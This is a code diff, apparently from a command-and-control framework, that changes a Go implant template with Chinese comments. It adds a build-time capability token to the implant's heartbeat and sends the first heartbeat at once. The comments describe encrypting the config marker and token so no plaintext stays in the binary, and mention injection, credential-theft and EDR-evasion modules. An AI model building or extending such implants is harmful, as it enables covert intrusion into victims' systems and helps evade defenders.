@@ -199,15 +199,34 @@ type Result struct {
 	Error    string
 }
 
+// Heartbeat 心跳负载的本地镜像。
+// ⚠️ 字段名必须与 internal/common/protocol.Heartbeat **完全一致**（那边没有 json tag，
+// 序列化用的就是 Go 字段名），否则服务端解不出 Modules、能力位白上报。
 type Heartbeat struct {
 	Status     string
 	CPUUsage   float32
 	MemoryUsed uint64
+	// Modules 载荷自报的"本构建真的编译进去了哪些能力"（v1.4.0 S4）。
+	// 只放构建期烘焙的位图令牌（cap:v1:<16位hex>），能力名表只留在服务端
+	// （internal/common/features）—— 本模板是独立 module，import 不到服务端包，
+	// 复制一份能力名表迟早会和构建期的真相漂移。
+	Modules []string
 }
 
 // configBlockMagic 是追加在二进制尾部的配置块标识，服务端写入、implant 启动时读取。
 // 编译期由服务端混淆工具加密为 xd("hex") 密文，二进制中不保留明文。
 var configBlockMagic = "TOSHELL_CFG_V1:"
+
+// capabilityToken 是构建期烘焙的"本载荷真实能力位图"令牌（cap:v1:<16位hex>）。
+//
+// 由服务端 injectBuildConstants 注入明文占位符，紧接着 obfuscateImplantSources
+// 把它加密成 xd("hex") —— 与 configBlockMagic 完全同一套两层处理，二进制里没有明文
+// （能力清单本身也是指纹：一眼能看出这个样本带了注入/凭据/EDR 模块）。
+// 运行期由 xd 解出令牌，随心跳 Modules 上报；C2 用 internal/common/features 的
+// 同一个纯函数解码成 tabs/features，于是"界面上的按钮" == "载荷里的代码"。
+// 全 0 位图视为"未上报"（真实构建的 command/file_list 等基础能力恒在，不可能全 0），
+// 服务端会回退按 OS 推导而不是显示空面板。
+var capabilityToken = "cap:v1:0000000000000000"
 
 // implantConfig 是从尾部配置块解析出的运行时配置
 type implantConfig struct {
@@ -529,11 +548,13 @@ func run() {
 		return
 	}
 
-	lastHeartbeat := time.Now()
-	heartbeatFailures := 0
-	maxHeartbeatFailures := 5 // 对标 gost：增加容错次数
 	// 防御：构建参数 INTERVAL 若被替换成 0，会导致每圈狂发心跳并误判失败。
 	hbInterval := jitteredInterval(interval)
+	// 首次心跳**立即**发出：能力位只随心跳上报，若等一个完整心跳间隔（服务端默认可能
+	// 是 60s），控制台会先按 OS 兜底显示一堆载荷里根本没有的按钮 —— 正是 S4 要修的问题。
+	lastHeartbeat := time.Now().Add(-hbInterval)
+	heartbeatFailures := 0
+	maxHeartbeatFailures := 5 // 对标 gost：增加容错次数
 
 	for {
 		now := time.Now()
@@ -870,8 +891,29 @@ func getProcessName() string {
 	return filepath.Base(executable)
 }
 
-// B3：心跳 JSON 内容恒定，预构建字节避免每心跳 json.Marshal 与结构体分配。
-var heartbeatPayload = []byte(`{"Status":"alive","CPUUsage":0,"MemoryUsed":0}`)
+// B3：心跳 JSON 内容恒定（能力位是构建期常量），预构建字节避免每心跳 json.Marshal
+// 与结构体分配。Modules 里带上本构建的能力位令牌，C2 据此渲染操作面板。
+var heartbeatPayload = buildHeartbeatPayload()
+
+// buildHeartbeatPayload 构造恒定的心跳负载。
+// 失败时退回"无 Modules"的旧负载：宁可让服务端按 OS 兜底，也不要因为心跳序列化失败
+// 让整条保活链路出问题（心跳是链路存活的唯一信号）。
+func buildHeartbeatPayload() []byte {
+	payload, err := json.Marshal(Heartbeat{Status: "alive", Modules: capabilityModules()})
+	if err != nil {
+		return []byte(`{"Status":"alive","CPUUsage":0,"MemoryUsed":0}`)
+	}
+	return payload
+}
+
+// capabilityModules 返回要上报的能力位（放进 protocol.Heartbeat.Modules）。
+// 令牌为空（服务端注入失败）时返回 nil：服务端会按 OS 兜底推导，不会显示空面板。
+func capabilityModules() []string {
+	if capabilityToken == "" {
+		return nil
+	}
+	return []string{capabilityToken}
+}
 
 func sendHeartbeat() bool {
 	packet := &Packet{
